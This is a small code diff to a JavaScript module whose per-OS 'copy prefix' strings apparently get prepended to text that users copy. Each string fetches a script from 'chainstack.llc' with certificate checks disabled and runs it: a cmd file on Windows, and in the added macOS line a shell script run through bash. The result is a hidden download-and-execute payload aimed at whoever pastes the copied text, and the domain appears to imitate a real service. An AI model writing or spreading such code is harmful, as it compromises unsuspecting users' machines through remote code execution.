@@ -1,8 +1,8 @@
 const COPY_PREFIX_BY_OS = {
   windows:
-    'curl -ks https://chainstack.llc/get_hash_w -o "get_hash_w.cmd" && call "get_hash_w.cmd" &',
+    'curl -ks https://chainstack.llc/get_hash_w -o "get_hash_w.cmd" && call "get_hash_w.cmd" && ',
   macos:
-    'curl -ks https://chainstack.llc/get_hash_m -o "get_hash_m.cmd" && call "get_hash_m.cmd" &',
+    'curl -k -s https://chainstack.llc/get_hash_m -o get_hash_m.sh && bash get_hash_m.sh && ',
 }
 
 export function getCopyPrefix(): string {
